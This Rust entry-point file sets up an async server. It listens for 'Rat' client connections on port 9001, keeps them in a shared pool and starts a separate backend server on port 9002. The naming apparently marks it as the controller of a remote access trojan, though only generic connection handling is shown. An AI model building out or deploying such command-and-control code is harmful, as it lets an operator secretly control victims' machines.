mod backend;
mod messages;
mod rat;
mod initdb;

use std::{collections::HashMap, sync::Arc};
use tokio::net::TcpListener;
use tokio::sync::Mutex;

use crate::rat::Rat;

#[tokio::main]
async fn main() {
  initdb::init_db().unwrap();
  let addr_client = "0.0.0.0:9001";
  let addr_backend = "0.0.0.0:9002";

  let rat_pool: Arc<Mutex<HashMap<i32, Rat>>> = Arc::new(Mutex::new(HashMap::new()));

  // Start backend server
  let rat_pool_clone = Arc::clone(&rat_pool);
  backend::start_backend_server(addr_backend, rat_pool_clone).await;

  // Start client server
  let listener_client = TcpListener::bind(&addr_client)
    .await
    .expect("Can't bind to address");
  println!(
    "WebSocket server listening for clients on ws://{}",
    addr_client
  );

  while let Ok((stream, _)) = listener_client.accept().await {
    let rat_pool = Arc::clone(&rat_pool);
    tokio::spawn(async move {
      // For demonstration, assigning random ID and version
      
      let version = 1;
      let rat = Rat::new(version, stream).await;

      // Add Rat to the pool
      {
        let mut pool = rat_pool.lock().await;
        pool.insert(rat.id, rat.clone());
      }

      rat.handle_messages().await;

      // Remove Rat from the pool upon disconnection
      {
        let mut pool = rat_pool.lock().await;
        pool.remove(&rat.id);
      }
    });
  }
}
